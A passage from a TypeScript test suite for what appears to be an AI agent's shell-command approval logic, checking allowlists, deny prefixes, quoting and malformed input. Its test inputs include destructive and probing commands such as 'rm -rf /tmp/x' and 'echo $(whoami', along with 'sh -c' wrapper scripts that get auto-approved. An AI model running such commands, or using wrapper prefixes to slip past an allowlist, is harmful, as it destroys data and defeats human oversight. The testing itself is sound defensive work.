	// single quoted argument must be treated as one command. The embedded
	// newlines belong to the quoted string and must not be mistaken for a
	// multi-statement sequence that would defeat allowlist auto-approval.
	const wrappedSingleQuoted = [
		`sh -c 'kubectl exec pod -- python3 -c "`,
		`import urllib.request`,
		`url = \\"http://127.0.0.1:49527/\\"`,
		`try:`,
		`    with urllib.request.urlopen(url, timeout=10) as r:`,
		`        print(r.status)`,
		`except Exception as e:`,
		`    print(\\"fetch failed:\\", e)`,
		`"'`,
	].join("\n")

	it("auto-approves a multi-line single-quoted script when the wrapper prefix is allowed", () => {
		expect(getCommandDecision(wrappedSingleQuoted, ["sh"])).toBe("auto_approve")
	})

	it("auto-approves a multi-line double-quoted script when the wrapper prefix is allowed", () => {
		const wrappedDoubleQuoted = 'sh -c "echo line1\necho line2"'
		expect(getCommandDecision(wrappedDoubleQuoted, ["sh"])).toBe("auto_approve")
	})

	it("asks user when the wrapper prefix is not in the allowlist", () => {
		expect(getCommandDecision(wrappedSingleQuoted, ["git"])).toBe("ask_user")
	})

	it("still splits genuine multi-statement scripts and asks when a statement is not allowed", () => {
		// Real unquoted newlines separate independent statements; each must be on
		// the allowlist for auto-approval to engage.
		const multiStatement = "echo hello\nrm -rf /tmp/x"
		expect(getCommandDecision(multiStatement, ["echo"])).toBe("ask_user")
	})

	it("auto-approves a genuine multi-statement script when every statement is allowed", () => {
		const multiStatement = "echo hello\nls -la"
		expect(getCommandDecision(multiStatement, ["echo", "ls"])).toBe("auto_approve")
	})

	it("auto-approves an ANSI-C quoted ($'...') multi-line argument when the wrapper prefix is allowed", () => {
		const ansiC = "sh -c $'echo 1\necho 2'"
		expect(getCommandDecision(ansiC, ["sh"])).toBe("auto_approve")
	})

	it("returns malformed_command for a command with an unterminated quote regardless of allowlist", () => {
		// An unterminated quote is a shell syntax error. Even if the leading word
		// is on the allowlist (or the allowlist is the wildcard), or the exact
		// full command string is listed, the command must not be auto-approved --
		// the shell would report a syntax error and any prefix that ran before
		// the error could have unintended side effects.
		const malformed = "sh -c 'echo a\necho b"
		expect(getCommandDecision(malformed, ["sh"])).toBe("malformed_command")
		expect(getCommandDecision(malformed, ["*"])).toBe("malformed_command")
		expect(getCommandDecision(malformed, [malformed])).toBe("malformed_command")
	})
})

describe("getCommandDecisionDetailed", () => {
	it("names the offending sub-command and matched denied prefix on chained commands", () => {
		const result = getCommandDecisionDetailed("git status && rm x && npm test", ["git", "npm"], ["rm"])

		expect(result.decision).toBe("auto_deny")
		expect(result.offendingCommand).toBe("rm x")
		expect(result.matchedPattern).toBe("rm")
	})

	it("preserves the original casing of the matched denied prefix", () => {
		const result = getCommandDecisionDetailed("RM -rf /tmp/x", [], ["RM -rf"])

		expect(result.decision).toBe("auto_deny")
		expect(result.matchedPattern).toBe("RM -rf")
	})

	it("names the first sub-command lacking an allowlist match for ask_user decisions", () => {
		const result = getCommandDecisionDetailed("git status && unknown-tool", ["git"])

		expect(result.decision).toBe("ask_user")
		expect(result.offendingCommand).toBe("unknown-tool")
		expect(result.matchedPattern).toBeUndefined()
	})

	it("reports the parse error message for malformed commands", () => {
		const result = getCommandDecisionDetailed("sh -c 'echo a", ["sh"])

		expect(result.decision).toBe("malformed_command")
		expect(result.offendingCommand).toBe("sh -c 'echo a")
		expect(result.parseError).toContain("unterminated")
	})

	it("returns plain approval details for auto-approved commands", () => {
		expect(getCommandDecisionDetailed("git status", ["git"])).toEqual({ decision: "auto_approve" })
		expect(getCommandDecisionDetailed("   ", ["git"])).toEqual({ decision: "auto_approve" })
	})

	it("reports malformed_command for an unclosed command substitution", () => {
		// An opened "$(" that the scanner cannot close leaves the input's
		// structure unaccounted for. The parser reports the raw, unsplit command
		// so that no fragment of a partial decomposition can be approved on its
		// own.
		const result = getCommandDecisionDetailed("echo $(whoami", ["echo"])

		expect(result.decision).toBe("malformed_command")
		expect(result.offendingCommand).toBe("echo $(whoami")
		expect(result.parseError).toContain("command substitution")
	})

	it("returns the same decision as getCommandDecision across representative inputs", () => {
		const cases: Array<[string, string[], string[] | undefined]> = [
			["git status", ["git"], []],
			["git push origin", ["git"], ["git push"]],
			["git status && rm file", ["git"], ["rm"]],
			["unknown command", ["git"], ["rm"]],
			['echo "${var@P}"', ["echo"], []],
			["sh -c 'echo a", ["sh"], []],
			["", ["git"], []],
		]

		for (const [command, allowed, denied] of cases) {
			expect(getCommandDecisionDetailed(command, allowed, denied).decision).toBe(
				getCommandDecision(command, allowed, denied),
			)
		}
	})
})
